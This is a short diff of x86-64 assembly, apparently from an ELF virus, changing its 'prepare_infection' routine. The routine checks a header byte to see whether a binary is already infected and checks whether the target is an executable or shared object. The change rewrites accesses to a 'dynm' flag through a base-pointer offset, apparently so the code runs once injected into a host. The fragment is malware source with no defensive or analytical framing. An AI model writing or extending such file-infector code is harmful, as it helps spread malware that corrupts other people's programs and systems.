@@ -68,12 +68,19 @@ prepare_infection:
 	; check infected
 	cmp byte [r14 + 0xa], 0x0
 	jne .close_file
-	mov	BYTE [rel dynm], 0
+
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.dynm
+
+	mov	BYTE [rax], 0
 
 
 	cmp	byte [r14 + 0x10], 0x02
 	je	.continue_infection
-	mov	BYTE [rel dynm], 1
+	mov		rax, [rbp + 16]
+	add		rax, mydata.dynm
+	mov	BYTE [rax], 1
 	cmp	byte [r14 + 0x10], 0x03
 	je	.continue_infection
 
